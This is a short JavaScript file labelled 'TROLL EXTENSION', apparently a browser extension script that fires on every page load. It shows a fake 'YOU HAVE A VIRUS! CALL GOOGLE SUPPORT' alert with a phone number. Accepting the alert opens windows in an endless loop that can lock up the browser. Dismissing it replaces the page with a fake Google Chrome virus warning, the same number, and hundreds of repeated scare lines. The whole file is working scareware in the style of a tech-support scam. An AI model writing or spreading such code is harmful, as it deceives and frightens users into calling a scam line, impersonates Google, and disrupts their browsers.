//TROLL EXTENSION
function things() {

	//Changes html file
	


	//Does annoying window thing
	var x = confirm("YOU HAVE A VIRUS! CALL GOOGLE SUPPORT : 888-513-6392");

	if (x == true) {

		while(true) {
			window.open("https://www.google.com/");
		}
	} else {

		$(document).ready(function() {
			$("body").remove(); 
		document.write("<body class='things' style='background-color: black; text-align: center'><br><br><div><font color='red'><h1 style='font-family: 'Arial Black', Gadget, sans-serif>GOOGLE CHROME HAS DETECTED A VIRUS!</h1></div><br><h1>FOR GOOGLE CHROME SUPPORT,</h1><h1>CALL THIS TOLL FREE NUMBER: 888-513-6392</h1></font><br><br><br><br><script>for(var i = 0; i < 500; i++) { document.write('<h1>YOU HAVE A VIRUS!!!</h1> <br><br>') }</script></body>");
		});
	}
}

//Calls function on page load
window.onload = things()